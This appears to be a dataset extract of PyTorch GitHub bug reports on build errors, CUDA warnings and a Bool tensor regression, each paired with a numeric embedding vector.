  3.27421337e-01  1.78701907e-01 -4.92711484e-01  1.29172653e-01
  1.34830117e-01  3.10775876e-01  8.70334655e-02  4.26373743e-02
  3.49642970e-02  4.39003617e-01 -7.06585497e-02  8.85896087e-02
 -1.41797781e-01 -2.26264551e-01  2.65144438e-01 -2.51806140e-01
 -1.17548458e-01  1.58110365e-01 -5.25125936e-02 -2.31223881e-01
 -2.26162121e-01 -4.94717479e-01  3.18083689e-02  6.82959974e-01
 -1.70899555e-04 -9.47185606e-02  1.37767876e-02  1.96639240e-01
 -6.29252866e-02 -1.46318138e-01  4.22632843e-02  2.84677297e-01
  6.98181748e-01  9.33934152e-02  9.33900476e-02  2.73396373e-01
 -8.17324519e-02  1.97953418e-01 -1.41131699e-01  4.21275944e-02
 -2.54128911e-02 -3.55815321e-01 -7.17037097e-02 -2.02000186e-01
 -1.11452177e-01  2.95912564e-01 -4.90564942e-01  8.66519213e-02
 -2.15412930e-01  5.78388833e-02  5.34462333e-01 -1.80969864e-01
 -1.28384069e-01 -2.87873950e-02  1.94844425e-01  2.94807792e-01
  4.25850004e-02  1.87206551e-01  5.25819540e-01 -3.57058868e-02]"
XNNPACK/src/qu8-requantization/precise-psimd.c:139:1: error: unrecognizable insn: high priority triage review module: build triaged has workaround module: xnnpack,"## ðŸ› Bug

on commit 5c8896f8ad80b7e8a463bbc3428c0635fccbf01a

build with:
`
USE_CUDA=0 DEBUG=1 BUILD_CAFFE2_OPS=0 python setup.py install
`

result:
```
../third_party/pthreadpool/include/pthreadpool.h:997:2: warning: â€˜pthreadpool_function_1d_tâ€™ is deprecated [-Wdeprecated-declarations]
  pthreadpool_function_1d_t function,
  ^~~~~~~~~~~~~~~~~~~~~~~~~
../third_party/pthreadpool/include/pthreadpool.h:1003:2: warning: â€˜pthreadpool_function_1d_tiled_tâ€™ is deprecated [-Wdeprecated-declarations]
  pthreadpool_function_1d_tiled_t function,
  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
../third_party/pthreadpool/include/pthreadpool.h:1010:2: warning: â€˜pthreadpool_function_2d_tâ€™ is deprecated [-Wdeprecated-declarations]
  pthreadpool_function_2d_t function,
  ^~~~~~~~~~~~~~~~~~~~~~~~~
../third_party/pthreadpool/include/pthreadpool.h:1017:2: warning: â€˜pthreadpool_function_2d_tiled_tâ€™ is deprecated [-Wdeprecated-declarations]
  pthreadpool_function_2d_tiled_t function,
  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
../third_party/pthreadpool/include/pthreadpool.h:1026:2: warning: â€˜pthreadpool_function_3d_tiled_tâ€™ is deprecated [-Wdeprecated-declarations]
  pthreadpool_function_3d_tiled_t function,
  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
../third_party/pthreadpool/include/pthreadpool.h:1037:2: warning: â€˜pthreadpool_function_4d_tiled_tâ€™ is deprecated [-Wdeprecated-declarations]
  pthreadpool_function_4d_tiled_t function,
  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
../third_party/XNNPACK/src/qs8-requantization/precise-psimd.c: In function â€˜xnn_qs8_requantize_precise__psimdâ€™:
../third_party/XNNPACK/src/qs8-requantization/precise-psimd.c:139:1: error: unrecognizable insn:
 }
 ^
```

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

 - PyTorch Version (e.g., 1.0):
 - OS (e.g., Linux):
 - How you installed PyTorch (`conda`, `pip`, source):
 - Build command you used (if compiling from source):
 - Python version:
 - CUDA/cuDNN version:
 - GPU models and configuration:
 - Any other relevant information:

## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @gchanan @zou3519 @bdhirsh @malfet @seemethere @walterddr",True,"[-5.35731316e-01 -3.00842345e-01 -1.67801261e-01  1.26176551e-01
  1.79381192e-01 -3.35705280e-01 -1.04945526e-01  1.29662320e-01
 -5.43200254e-01 -1.43333942e-01  1.11407027e-01  2.57085264e-03
  1.07758939e-02 -6.26155287e-02 -2.52676874e-01 -1.43524818e-03
 -1.59662783e-01 -5.50188541e-01  1.72673017e-01 -4.43902239e-02
 -1.37210444e-01 -7.41543621e-02 -6.29127979e-01 -1.41765364e-03
  4.51388955e-01 -1.20971255e-01  5.12941480e-02 -1.00954464e-02
  8.54474381e-02  1.88158080e-01  5.08390725e-01  3.15173507e-01
 -3.03758681e-03  7.93860555e-02  4.07590389e-01  6.74722940e-02
 -3.19464743e-01 -3.34788024e-01  1.05598524e-01 -1.79603070e-01
 -1.85706601e-01  2.35334467e-02 -1.32959262e-01 -7.89358616e-02
  1.34555176e-01 -4.97410074e-04 -8.36866125e-02 -1.47156231e-02
  3.50998715e-04  3.35804671e-02 -1.71463013e-01  3.12966824e-01
 -2.76248902e-01 -4.04622883e-01  2.26088867e-01  9.68598649e-02
  1.14692628e-01  1.09580785e-01  9.54919755e-02 -9.28552598e-02
  5.38406134e-01 -1.46377161e-01 -1.28217846e-01  2.20785029e-02
 -2.31558457e-04  4.11549449e-01  1.22286305e-01 -1.16990201e-01
  3.63506556e-01  1.36205584e-01  2.92648315e-01 -1.35417923e-01
 -5.67574859e-01 -1.05879843e-01  1.16306722e-01  3.27114552e-01
 -9.11470205e-02 -2.04815529e-02 -3.80106941e-02 -2.07702428e-01
 -3.23058724e-01  1.36713646e-02  4.95867059e-02 -1.42501891e-01
  1.01821199e-01 -1.86659083e-01 -3.11094318e-02  6.34957105e-02
 -5.90370670e-02  3.94505933e-02  6.78127766e-01  2.72981137e-01
  7.15994686e-02  1.01453468e-01  2.14240164e-01 -5.96423671e-02
  8.44100192e-02 -3.45816799e-02 -3.94782782e-01 -2.27985844e-01
  1.28236651e-01 -9.18913186e-02 -2.75941700e-01  1.42825961e-01
 -1.02110907e-01 -3.45967077e-02  5.16456246e-01 -1.05097204e-01
  2.32678831e-01 -2.70003397e-02  8.16222876e-02  5.43295546e-03
  7.82794952e-02 -4.66718748e-02  3.63233149e-01  6.04322910e-01
 -2.37281203e-01  3.10381353e-01  2.07519531e-02  3.95765215e-01
 -1.47926465e-01  2.74819970e-01  1.27708623e-02  2.67128125e-02
  2.87324376e-03  1.04886495e-01  2.64814258e-01 -1.15496665e-02
 -2.47888237e-01  2.57402733e-02 -2.04126015e-01  8.19862857e-02
 -6.91342428e-02  7.80989677e-02  1.99623674e-01  1.61765605e-01
 -1.68879360e-01 -2.34431878e-01 -8.80675912e-02 -3.73795092e-01
 -1.95313096e-01  3.68569121e-02 -4.75765243e-02 -4.67842221e-01
  1.47906303e-01  1.58198476e-01 -3.48131597e-01  2.99674273e-01
  6.39401600e-02 -2.76022911e-01 -1.07229605e-01  2.46757995e-02
 -2.98688382e-01  6.60848022e-01 -1.38286743e-02  3.09560120e-01
  2.58050382e-01  2.24303268e-02 -1.23268977e-01 -6.66444451e-02
  1.56686112e-01  2.68991381e-01 -9.60893705e-02 -2.68913433e-02
  6.15867637e-02 -1.58341542e-01 -5.91155767e-01 -1.34998590e-01
 -1.72069967e-01  1.04040831e-01 -3.36675465e-01 -3.27884406e-02
  2.50878036e-01  3.43839973e-02  4.14567776e-02 -8.27270448e-02
  3.44260521e-02 -3.54140878e-01 -1.67972580e-01  1.13472268e-01
  4.19059843e-02  4.20432925e-01  4.93823886e-02 -2.44014282e-02
  1.59490451e-01  4.45050597e-02  2.53516018e-01 -2.88589150e-01
  1.69286400e-01 -3.80110294e-02 -3.84572536e-01  3.76874596e-01
  2.28339761e-01 -1.89529546e-02  1.34923637e-01 -1.09860525e-01
  2.69803435e-01  1.12573922e-01  1.02823466e-01  7.94628859e-02
 -2.30777711e-01  1.47918314e-01  5.76651096e-02  6.16052076e-02
 -1.55426294e-01 -6.68151230e-02 -2.32795820e-01 -1.14635102e-01
 -9.12401527e-02 -3.26323099e-02 -1.62013337e-01 -3.44724387e-01
  5.92825487e-02 -9.22968984e-02 -1.16221018e-01  3.45007867e-01
  1.08767942e-01  1.68187425e-01  4.83675674e-02  1.59524202e-01
  1.38162360e-01 -2.89848924e-01  1.21078059e-01 -5.77823341e-01
  2.31603116e-01 -1.29802078e-01  7.36304820e-02 -3.21091175e-01
 -7.74819925e-02  1.74936965e-01 -9.48423594e-02 -5.84900975e-01
  2.71357656e-01 -1.55838169e-02  9.25963521e-02 -2.08532020e-01
  1.48258239e-01 -5.10764830e-02 -3.94206494e-04  3.50830555e-01
 -1.76363543e-01 -1.23108409e-01 -2.86302697e-02  4.78451215e-02
  4.68657017e-01 -2.79951692e-01 -2.41923966e-02 -1.51007846e-01
 -9.82555598e-02  4.06747073e-01 -2.46514231e-02 -2.38184750e-01
  3.52408797e-01  1.25516564e-01 -1.09727472e-01 -8.09279233e-02
 -9.61570591e-02  1.61613658e-01 -2.34883428e-02  1.77230254e-01
  4.42130774e-01  2.78839827e-01 -2.47433275e-01  1.62758619e-01
  1.73878625e-01  3.37251425e-01 -1.61526218e-01  5.26240826e-01
  1.83733985e-01 -2.24459797e-01  2.77447641e-01 -3.70605469e-01
  1.35323629e-01  8.71096253e-02  1.86567396e-01 -1.57965109e-01
  5.27831912e-01  3.30617838e-02  1.84231326e-01 -1.20875817e-02
  7.17725605e-02  4.21048760e-01 -1.77967489e-01  7.19855353e-03
  2.61298358e-01 -2.08888650e-01  1.82862133e-02 -3.75096619e-01
 -3.16998243e-01  1.19208738e-01  8.58462602e-02  2.94008255e-01
  2.31471643e-01 -1.73936710e-01 -4.42614034e-02  1.97491378e-01
  1.07893065e-01 -2.19459176e-01  1.00747883e-01  8.04841816e-02
 -3.15920472e-01  1.26821339e-01  1.04267001e-01 -1.08787291e-01
 -1.17644437e-01 -1.03618458e-01  4.35482338e-02  1.74637616e-01
  4.15897191e-01 -6.04248524e-01  4.74549234e-01  2.81752080e-01
  7.84673840e-02  1.60420507e-01 -3.87733221e-01  1.05979577e-01
 -1.01464026e-01  2.75063276e-01  1.58656418e-01 -1.94656357e-01
 -2.52056360e-01 -1.74155861e-01 -4.59560513e-01 -1.13606276e-02
  2.80488372e-01  2.12433115e-02 -3.96719515e-01 -1.17454976e-01
 -6.21499717e-02  3.71117145e-02 -1.78967100e-02  1.37752354e-01
 -2.57853329e-01  1.71938926e-01 -1.91046044e-01 -3.87845784e-02
 -2.92700857e-01  1.58259928e-01  5.50403483e-02 -2.47696802e-01
  2.30002273e-02 -6.90638274e-02  1.39066845e-01 -3.12970579e-01
 -4.72377926e-01 -1.44321710e-01  3.36819530e-01  4.66864049e-01
 -2.12603062e-01 -3.35036993e-01 -4.17022556e-02  3.97942737e-02
 -1.58876423e-02 -1.69085432e-02  7.46445507e-02  2.02920645e-01
  3.49636562e-02  3.58310580e-01  3.98422897e-01  7.08209127e-02
 -5.12815595e-01  9.03025791e-02 -5.02984643e-01  1.86134502e-03
  1.26024798e-01 -2.18004927e-01 -2.21568868e-01 -3.77951637e-02
 -1.23486668e-01  2.54251659e-01 -1.93025142e-01  2.00612873e-01
 -5.89181110e-03  3.30655247e-01  2.86866724e-01 -1.15534894e-01
 -2.61569247e-02  4.30381119e-01  2.23220997e-02  1.71707012e-04
  8.54416490e-02  8.90447050e-02  2.86003888e-01  5.96841685e-02]"
PyTorch 1.7.0 CUDA driver warning module: cuda triaged,"## ðŸ› Bug

The following warning appears only on `torch==1.7.0`

```
../../../virtualenv/python3.8.3/lib/python3.8/site-packages/torch/cuda/__init__.py:52

  /home/travis/virtualenv/python3.8.3/lib/python3.8/site-packages/torch/cuda/__init__.py:52: UserWarning: CUDA initialization: Found no NVIDIA driver on your system. Please check that you have an NVIDIA GPU and installed a driver from http://www.nvidia.com/Download/index.aspx (Triggered internally at  /pytorch/c10/cuda/CUDAFunctions.cpp:100.)

    return torch._C._cuda_getDeviceCount() > 0
```

Looking at the [pull request](https://github.com/pytorch/pytorch/pull/42249) that introduced it, no warning should be raised for ""call to device_count()"" with ""no gpus""

Having to filter this warning every time `device_count` is called is not ideal.

## To Reproduce

`torch.cuda.device_count()`

## Expected behavior

Does not raise a warning.


cc @ezyang @gchanan @zou3519 @bdhirsh @heitorschueroff @ngimel",True,"[-1.49082243e-01 -4.37855303e-01 -3.38082343e-01  3.86247396e-01
  2.98650861e-01 -3.56050491e-01  6.21878542e-02  1.82489112e-01
 -4.70266163e-01 -1.10101722e-01 -2.67474890e-01 -3.30631316e-01
 -2.11636871e-01 -2.22325444e-01 -1.63425818e-01  5.27693145e-02
 -8.03178828e-03 -2.26311505e-01 -1.72078013e-01 -2.58289009e-01
  7.04892799e-02  1.27036586e-01 -2.49162987e-01 -7.94214197e-03
  8.62414241e-02  6.57999516e-02 -2.07011178e-01 -1.03321709e-02
  1.09651692e-01  2.34590605e-01  1.37990773e-01  3.34535800e-02
 -5.32449663e-01  1.61870122e-01  3.28881502e-01 -2.28005558e-01
 -4.42134976e-01 -2.43079334e-01 -7.71532878e-02 -2.75766909e-01
  1.05849311e-01 -1.77681118e-01 -1.87806368e-01 -4.89810714e-03
 -2.06136793e-01 -1.57642096e-01 -1.60187483e-06  1.00337811e-01
 -2.04253867e-01 -2.92161703e-01  1.22447915e-01  4.32097912e-02
  2.12940708e-01 -2.25805879e-01  3.48465145e-01 -2.47428298e-01
 -2.98109353e-01  3.48019391e-01  1.77381605e-01  5.35057113e-02
  3.32014084e-01 -1.54336780e-01  1.10703751e-01  1.50978148e-01
 -1.09178849e-01  3.88592660e-01 -2.94720948e-01 -1.21841528e-01
  4.12135065e-01 -9.63889062e-02 -5.67565039e-02  7.30181336e-02
 -1.18955143e-01 -3.16200256e-01 -1.57535061e-01  7.74146914e-02
  4.75207604e-02  1.52317464e-01 -3.83568168e-01 -4.53914776e-02
  5.65251634e-02  2.96192706e-01  2.39393324e-01 -2.46992916e-01
 -1.91647857e-02 -4.05274294e-02  6.41252100e-02  4.67760861e-02
  2.42359608e-01 -7.39222020e-02  2.92090297e-01  7.99620450e-02
  4.32087541e-01  3.59410435e-01 -1.88407958e-01 -1.64195657e-01
  1.40750140e-01 -2.43841618e-01 -5.79565167e-01 -4.80437845e-01
 -1.39850810e-01 -3.69282424e-01 -2.90008843e-01  4.91564274e-01
 -9.33562964e-02 -3.22137289e-02  1.92676336e-01  1.71328008e-01
 -9.59132463e-02 -2.70737737e-01  4.87671703e-01 -1.18787438e-01
  1.36448696e-01  5.59543259e-02  1.63937271e-01  1.55027285e-01
 -6.42458200e-01  2.87377685e-02  1.96520966e-02  2.70298630e-01
 -2.53084749e-01 -1.06115222e-01  1.39570683e-01  1.30851239e-01
  4.04268503e-01  1.35717317e-01  2.68587887e-01  4.68396991e-02
 -1.78782806e-01  2.35226259e-01 -1.94477111e-01 -8.74992013e-02
  2.54781008e-01  5.36315888e-02 -4.02683355e-02  2.63222545e-01
 -1.08865499e-01 -4.32807356e-02  2.60199249e-01 -1.17148086e-02
 -1.35940239e-01  1.08284447e-02  7.36083239e-02 -1.94176048e-01
  5.30631095e-02 -1.00548953e-01 -2.05998838e-01  9.77985114e-02
  1.06977999e-01  2.79193819e-01 -1.35253668e-01  2.74251282e-01
 -6.20980322e-01  6.46794081e-01  3.33492644e-02  2.37326935e-01
  2.07108796e-01 -6.77030459e-02  4.36345600e-02 -3.86924028e-01
  5.63718855e-01  3.55306029e-01 -1.50072858e-01  1.75714612e-01
 -3.25928628e-01  1.00366712e-01 -4.55224812e-01 -5.49384840e-02
 -2.78006583e-01 -1.03391290e-01 -2.13953316e-01 -1.03252649e-01
  1.28795113e-03 -1.99656069e-01  2.66225990e-02 -1.94338173e-01
 -6.11732230e-02 -3.66094917e-01  1.10670760e-01  4.41519856e-01
  6.52742460e-02  5.07060170e-01  4.49933529e-01  9.67641026e-02
  1.71325535e-01  3.18544984e-01  1.83293313e-01 -1.05030596e-01
 -1.63593560e-01 -3.86185467e-01 -9.58454236e-02 -2.52096832e-01
  1.07601546e-01 -1.25396430e-01  1.03513822e-01  4.29442525e-01
  2.69491356e-02  1.37635708e-01  1.84547052e-01 -6.93955272e-02
  7.30712339e-02  1.74439177e-01  1.09275468e-01  2.25961104e-01
 -1.92373693e-01 -1.83101088e-01 -4.09614801e-01 -2.10217610e-01
 -1.49870664e-01 -2.05008715e-01 -1.60866201e-01 -3.88222784e-02
 -1.58081621e-01 -2.74831265e-01 -1.73164085e-01  3.61010671e-01
 -5.25416248e-02  1.70630455e-01  1.31910130e-01  3.53074551e-01
  4.77121353e-01 -1.46918586e-02  4.83525842e-02 -2.15972990e-01
  3.55908543e-01 -3.90898436e-03  9.59401056e-02 -2.82566577e-01
 -1.11036874e-01 -4.03234698e-02 -2.51353234e-01 -5.92001528e-02
  1.29614636e-01  4.83056307e-02  5.43392971e-02  3.17015767e-01
  4.97858934e-02 -1.42718563e-02 -1.38925105e-01  2.24916607e-01
 -1.88899592e-01  1.28518894e-01 -1.13773853e-01 -5.93342222e-02
  1.37378246e-01 -9.87766311e-02 -4.12938237e-01  9.20828991e-03
 -4.23046887e-01  8.34369659e-02  6.42085195e-01 -1.69101983e-01
 -4.07478243e-01 -2.38497674e-01  1.10153124e-01  1.36800826e-01
 -5.70436846e-03  1.98188275e-01  1.07592419e-02  2.41536833e-02
  2.49254972e-01  2.72145987e-01 -3.72256815e-01  1.42399698e-01
  3.27599458e-02  2.19498962e-01 -3.85727197e-01  3.96336704e-01
 -1.98013604e-01 -1.55242234e-02  2.06949383e-01 -5.47135949e-01
  3.57032120e-01  4.38137949e-02  2.44089499e-01 -1.57986492e-01
  4.79184806e-01  5.99190891e-02 -1.07088620e-02 -2.92506944e-02
  6.34598851e-01  4.38303500e-02  2.24310324e-01  9.32799578e-02
  4.69328403e-01 -1.76898479e-01 -2.15212330e-01 -2.41721481e-01
 -1.95337504e-01 -1.23288527e-01 -2.48605818e-01  2.49937624e-01
  5.00607133e-01  3.71273980e-02 -1.92574963e-01  5.48857711e-02
  6.89737946e-02  1.47079855e-01  1.52778804e-01  4.75849733e-02
 -4.77357715e-01  4.93666083e-02  1.57112867e-01 -4.68059838e-01
 -3.23574126e-01 -3.37154210e-01  3.99818122e-02  1.34395406e-01
  4.96541321e-01 -3.34253430e-01  2.74543881e-01  4.83766906e-02
  1.38666248e-02  3.35299492e-01 -1.16468944e-01  1.91799641e-01
 -8.73508155e-02  3.30626637e-01  2.11215675e-01 -2.82299966e-02
 -1.08081728e-01 -4.88057554e-01 -5.61481476e-01 -1.31268248e-01
  3.65993530e-01  2.22362697e-01 -3.84095043e-01  1.71350598e-01
 -3.19748759e-01  1.47729665e-01  2.27502272e-01  1.03583038e-01
  1.19736664e-01  2.92505354e-01 -2.07304388e-01  2.39041090e-01
 -1.30504638e-01 -9.41013694e-02  3.20846260e-01 -3.65946263e-01
 -1.57262892e-01 -2.29610205e-01 -1.08589806e-01 -2.36875415e-01
 -1.49260223e-01 -1.82273313e-01  3.37516010e-01  4.62767005e-01
 -4.74606007e-02  5.16322777e-02 -1.32523000e-01  1.70181036e-01
  4.02850844e-03  7.77553543e-02  1.86409652e-01  7.07678676e-01
  5.08343458e-01  3.27016115e-01  2.24726096e-01  1.62422955e-01
 -1.74190164e-01  3.21885049e-01 -2.19056338e-01 -3.33189666e-01
 -1.18551858e-01 -2.91806936e-01 -1.24501109e-01  2.64892001e-02
  1.45978451e-01 -3.57915498e-02 -4.77975458e-01 -3.46720368e-02
 -1.21338561e-01  2.26609945e-01  4.30803120e-01 -1.63558573e-01
 -1.43836871e-01  6.80932179e-02  1.24279171e-01  4.90797758e-02
  2.02571660e-01  1.72339171e-01  5.09162992e-02 -3.47911954e-01]"
"RuntimeError: ""mul_cuda"" not implemented for 'Bool' high priority triage review triaged module: regression module: boolean tensor","## ðŸ› Bug

I just upgraded to PyTorch 1.7 and I now get an this error when multiplying a Python bool with a cuda bool tensor. I do not get the error on CPU. Furthermore, it was working well on the previous version (1.6).

## To Reproduce

![image](https://user-images.githubusercontent.com/1090012/97480979-88d65200-192a-11eb-8414-4afe5eb7be71.png)

## Environment

Collecting environment information...
PyTorch version: 1.7.0+cu110
Is debug build: True
CUDA used to build PyTorch: 11.0
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.1 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
Clang version: Could not collect
CMake version: Could not collect

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration: 
GPU 0: GeForce GTX 1080 Ti
GPU 1: GeForce GTX 1080 Ti
GPU 2: GeForce GT 1030

Nvidia driver version: 450.51.06
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.18.5
[pip3] torch==1.7.0+cu110
[pip3] torchaudio==0.7.0
[pip3] torchvision==0.8.1+cu110
[conda] Could not collect



cc @ezyang @gchanan @zou3519 @bdhirsh @heitorschueroff @izdeby",True,"[-0.26307577 -0.6004039  -0.34906673 -0.05862776  0.08256124 -0.3216107
 -0.15197736 -0.18210778 -0.1702576  -0.33279708  0.05615351 -0.11254962
 -0.05829626  0.26349622 -0.24827455  0.05031146 -0.12224288 -0.17823629
  0.0419729  -0.09055392 -0.03064887  0.04131643 -0.187122    0.07204205
  0.21640587 -0.29786682 -0.06935255 -0.27819794  0.08969105 -0.1409801
  0.32561374  0.09072246  0.08386848 -0.16947784 -0.06906141  0.12350388
 -0.3106813  -0.29910627  0.10374258 -0.02483443 -0.09951837 -0.10212484
 -0.09662725 -0.06167498 -0.1512431  -0.02747501  0.05128129  0.36317843
  0.01585312  0.03910829 -0.07116482  0.2664122  -0.05348225 -0.31094036
  0.15536049 -0.02767147 -0.10676836 -0.02021673 -0.06153361 -0.10757561
  0.00961691  0.18541408  0.11492518  0.09511437  0.24987239  0.26043403
  0.1625783  -0.09247044  0.29890653 -0.05500577  0.04877099  0.12637225
 -0.35476345 -0.13164529 -0.07903944  0.2563904   0.01485904  0.29295743
  0.01249167  0.07126957  0.04566398 -0.04632467  0.10692152 -0.4267732
  0.2826423  -0.04544009  0.09849293  0.17692718  0.02367402 -0.12131052
  0.65963656  0.07183964 -0.10800579  0.22607088  0.2377165   0.16230735
 -0.04906257  0.06741619 -0.25501832 -0.19645926 -0.3793738  -0.31764776
 -0.13129407  0.33465958 -0.02401806  0.04834167 -0.01390393 -0.00718665
  0.12823579 -0.07197738  0.09981811 -0.10017833  0.32594478  0.06247037
  0.25924352  0.22508839 -0.07306658 -0.01008508  0.12340609  0.22124669
  0.03682466  0.09295486  0.07305467  0.25903684  0.12826687  0.39244547
 -0.09436119 -0.03310238 -0.02024767  0.09051812  0.3004107  -0.12817726
 -0.12027819  0.04567989 -0.30434534 -0.06335564 -0.05973766 -0.2705347
  0.03033815 -0.27723795 -0.02542229 -0.2589302   0.10816562 -0.11871884
  0.0582608   0.16882187 -0.04797918  0.18281808  0.02175331  0.22642303
 -0.03942742  0.07521912 -0.3722157   0.54234535  0.09641503  0.13993156
  0.35570964 -0.07362108  0.02682866 -0.3852752   0.12461603  0.50892824
  0.02214985  0.09357098 -0.15107977  0.23076692 -0.2548672   0.02864932
  0.12113598  0.2039695  -0.08705823  0.05161506  0.15722674 -0.447313
  0.06413967 -0.16246493 -0.14870347 -0.32317424 -0.02315371  0.2306636
 -0.04339828  0.23321651  0.22712858 -0.03909859  0.2164552  -0.10904027
  0.03044581 -0.16947815 -0.10482498 -0.03090131 -0.17203501 -0.26570877
 -0.04447436 -0.17103961 -0.12264253 -0.14317325  0.19784828  0.0838792
  0.17393076  0.20284304  0.03476741 -0.14536946  0.09129316 -0.00454316
  0.12132812 -0.16388743 -0.04910666 -0.18458702 -0.00973767  0.09613726
 -0.24538033 -0.34758848  0.10338344 -0.22326544 -0.39813215  0.20936742
  0.06793682 -0.07391587  0.12417705  0.23506917  0.06861799 -0.01018008
  0.24997179 -0.1184707   0.12012199 -0.00905014  0.21204625 -0.02528597
 -0.09266949 -0.03021406  0.02800366 -0.20551819  0.02781151  0.0283956
 -0.05657594 -0.03131189 -0.07191256 -0.09742667  0.23482287  0.43021026
 -0.19525306  0.01532431 -0.1538545  -0.10635695 -0.02402654  0.16196595
  0.05152633 -0.07358453 -0.563721   -0.06267285  0.08606794 -0.30485767
  0.46181893 -0.18359414  0.14127006 -0.1407862   0.01919219  0.15969285
  0.13497879  0.01221809  0.42920473  0.36376664 -0.09410396  0.2659903
  0.30653948  0.17256373 -0.38499212  0.07973631  0.01997497 -0.06283323
  0.12342369 -0.30189118  0.22560117 -0.18517393  0.1848634  -0.14311256
  0.60770464  0.01284626  0.0638806  -0.02386492  0.23341808  0.11387578
  0.02653911  0.01637018 -0.08368759 -0.09815617 -0.11582074 -0.30680907
 -0.2417757   0.08722555 -0.31329685  0.40250424  0.13682346 -0.18122187
 -0.41087472  0.19405276  0.10418236  0.00735245 -0.08690759 -0.00316778
 -0.51220024 -0.10742349  0.22596878 -0.10050216 -0.41452366 -0.0162883
  0.03975571  0.12539838  0.28187108 -0.42918187  0.32807124  0.0862363
 -0.05198888  0.19861808 -0.03434559  0.16577843 -0.05713253  0.5530462
  0.45764393  0.13053507 -0.2746498  -0.22278751 -0.5371964  -0.06831381
  0.34923333  0.17407109 -0.25114208 -0.13406219 -0.03356332  0.10834397
 -0.12717216  0.15654272 -0.01115941  0.06249837 -0.21718407  0.02611151
 -0.34427404  0.08970247  0.24645212 -0.3885409  -0.12446211 -0.21262847
 -0.11939816 -0.338474   -0.2847098  -0.20738496  0.24614063  0.5825897
 -0.14442205 -0.17779967 -0.03994954  0.09562913 -0.30593455 -0.2274954
 -0.03669963  0.16600385  0.11884331 -0.01710375  0.21187937  0.39597946
 -0.21809515  0.07550045 -0.17313427  0.03600283  0.28424025 -0.31721473
 -0.21535358 -0.24876273  0.27613562  0.15963057 -0.26109126  0.30551898
  0.0252298   0.21974742  0.32437062 -0.08525996 -0.13627332  0.12519038
  0.24362205  0.02777193  0.01986772 -0.04300809  0.21175736 -0.16143548]"
Constructing a ParameterDict raises a warning high priority module: nn triaged,"## ðŸ› Bug

Constructing a `ParameterDict` raises a `UserWarning`.

## To Reproduce

Install PyTorch 1.7
```py
>>> import torch.nn as nn
>>> nn.ParameterDict()
/Users/fobermey/opt/miniconda3/envs/pyro/lib/python3.7/site-packages/torch/nn/modules/container.py:550: UserWarning: Setting attributes on ParameterDict is not supported.
  warnings.warn(""Setting attributes on ParameterDict is not supported."")
ParameterDict()
```

## Expected behavior

PyTorch should not raise warnings in normal usage. Tests should verify this.

## Environment

```
PyTorch version: 1.7.0
Is debug build: True
CUDA used to build PyTorch: None
ROCM used to build PyTorch: N/A

OS: Mac OSX 10.15.7 (x86_64)
GCC version: Could not collect
Clang version: 12.0.0 (clang-1200.0.32.2)
CMake version: version 3.18.2

Python version: 3.7 (64-bit runtime)
Is CUDA available: False
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] numpyro==0.3.0
[pip3] torch==1.7.0
[pip3] torchfile==0.1.0
[pip3] torchvision==0.8.1
[conda] numpy                     1.19.0                   pypi_0    pypi
[conda] numpyro                   0.3.0                    pypi_0    pypi
[conda] torch                     1.7.0                    pypi_0    pypi
[conda] torchfile                 0.1.0                    pypi_0    pypi
[conda] torchvision               0.8.1                    pypi_0    pypi
```

cc @ezyang @gchanan @zou3519 @bdhirsh @heitorschueroff @albanD @mruberry",True,"[-2.98244953e-01 -2.49848589e-01 -2.64681101e-01  4.56174463e-02
  1.38903424e-01 -1.45790786e-01  8.29120055e-02 -8.19038134e-03
 -3.98826301e-01 -4.07071300e-02 -1.33155167e-01  1.63079381e-01
  1.70617193e-01  1.48501053e-01  2.89624576e-02  2.61996150e-01
  3.04445829e-02 -3.90969127e-01  1.79422870e-01 -2.41172940e-01
  1.09124064e-01  3.53345051e-02 -1.07026391e-01 -7.26088509e-03
 -3.51560980e-01 -4.35389169e-02 -2.30318487e-01 -1.08236037e-01
  1.96632683e-01  2.21188620e-01  7.58812204e-03  3.27405334e-02
 -4.33851272e-01 -6.55122772e-02  9.77102518e-02  2.10042119e-01
 -2.19950348e-01 -1.84403546e-02 -2.93834321e-02 -8.06154683e-04
  9.46017653e-02  1.86265290e-01 -1.59646481e-01  1.06319338e-02
 -3.72219563e-01 -6.15462810e-02  1.14319354e-01  2.74477005e-01
 -3.26124519e-01 -1.73242316e-01 -1.73915118e-01  1.50108203e-01
 -5.83140813e-02 -2.59420931e-01  1.67523131e-01 -1.67592973e-01
 -3.57615538e-02  2.92407393e-01 -8.90872627e-02 -2.97144115e-01
  1.15716897e-01  2.43269354e-02  1.27200723e-01 -1.86673224e-01
 -8.34956616e-02  2.01192886e-01 -7.78027326e-02  2.94263393e-01
  4.05212969e-01  7.31722862e-02  1.37382746e-01  1.78513005e-02
 -9.57511440e-02 -1.38460159e-01 -7.28474855e-02  1.34579942e-01
 -3.68282557e-01  1.36245042e-01 -1.08060896e-01 -3.66829932e-01
  1.25233792e-02  1.36463225e-01 -4.23307121e-02  3.63296978e-02
  4.25900444e-02 -1.27936050e-01  1.38976976e-01  9.20275152e-02
  3.38330209e-01  2.83361554e-01  4.00456369e-01 -2.38640785e-01
  3.39878470e-01  2.75996208e-01  7.59862214e-02  2.71290302e-01
 -2.13129252e-01 -2.45063990e-01 -2.48310611e-01 -2.08958030e-01
 -3.94633636e-02 -6.16894364e-01 -4.84049618e-01  1.40624359e-01
  2.48229116e-01 -9.99535769e-02  9.27862450e-02  3.05566967e-01
